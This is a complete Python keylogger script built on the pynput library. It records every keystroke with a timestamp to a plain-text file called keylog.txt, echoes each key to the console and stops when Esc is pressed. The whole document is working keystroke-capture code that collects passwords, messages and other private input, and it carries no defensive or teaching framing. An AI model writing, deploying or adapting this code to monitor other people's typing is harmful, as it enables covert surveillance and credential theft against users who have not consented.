from pynput import keyboard
import time
import os

# Define the log file location (user can specify)
log_file = "keylog.txt"

def keyPressed(key):
    """
    Logs pressed keys to a file with timestamps.

    Args:
        key: The key object captured by the listener.
    """
    try:
        # Attempt to get the character of the pressed key
        key_char = key.char
    except AttributeError:
        # If the key is a special key, convert it to a string
        key_char = str(key)

    # Timestamp for the keypress
    timestamp = time.strftime('%Y-%m-%d %H:%M:%S')

    # Write keypress to log file with timestamp
    with open(log_file, 'a') as logkey:
        logkey.write(f"{timestamp} - {key_char}\n")

    print(f"Key pressed: {key_char}")  # Optional: Display in the console for debugging

    # Stop the keylogger when 'Esc' is pressed
    if key == keyboard.Key.esc:
        print("Exiting keylogger...")
        return False  # Stops the listener

def on_error(error):
    """
    Handles any errors that occur during the listener execution.
    
    Args:
        error: The error that occurred.
    """
    print(f"Error occurred: {error}")

if __name__ == "__main__":
    # Check if the log file exists; if not, create it
    if not os.path.exists(log_file):
        with open(log_file, 'w'):  # Creates an empty log file
            pass

    print("Keylogger started. Press 'Esc' to stop.")
    # Set up the listener to log keys and handle errors
    with keyboard.Listener(on_press=keyPressed, on_error=on_error) as listener:
        listener.join()
